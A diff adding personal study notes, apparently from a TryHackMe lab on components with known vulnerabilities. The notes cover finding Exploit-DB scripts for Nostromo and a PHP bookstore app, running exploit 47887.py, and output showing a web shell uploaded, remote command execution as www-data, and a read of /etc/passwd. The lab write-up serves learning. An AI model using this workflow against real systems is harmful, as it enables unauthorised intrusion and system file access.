@@ -264,5 +264,45 @@ If you have performed the steps correctly, you will now have a remote shell to y
 find / | grep flag.txt    (to find the flag)
 
 
+Components With Known Vulnerabilities - Intro 
+wpscan tool - for wordpress
+
+Components With Known Vulnerabilities - Exploit
+this server is using the default page for the nostromo web server. 
+Nostromo 1.9.6
+use exploit-db to try and find an exploit for this particular version.
+download exploit script
+run it
+most scripts will just tell you what arguments you need to provide(no need to read the whole code)
+
+Components With Known Vulnerabilities - Lab
+was an online CSE bookstore made using PHP with MYSQL
+checked source code for version..no luck
+found that it was from http://projectworlds.in/
+was showing Admin Login 2017 on the page, so searched that, found some exploits for this in EDB but wasnt RCE, it was SQLi
+looked at the hint given by THM, it says "You know its a bookstore application, you should check for recent unauthenticated bookstore app rce's."
+seacrhed it and found an RCE on EDB. downloaded it and ran it using the following command because the note was : Note: When you find the exploit script, put all of your input in quotes, for example "id"
+python3 47887.py 10.10.2.86 80 "id"
+it said : 
+usage: 47887.py [-h] url
+47887.py: error: unrecognized arguments: 80 id
+
+so ran :
+python3 47887.py http://10.10.2.86
+
+output was:
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.2.86/bootstrap/img/JDb1FN4Uzw.php
+> Example command usage: http://10.10.2.86/bootstrap/img/JDb1FN4Uzw.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ 
 
 
+RCE $ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+task was to get how many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer) :
+
+RCE $ wc -c /etc/passwd
+1611 /etc/passwd
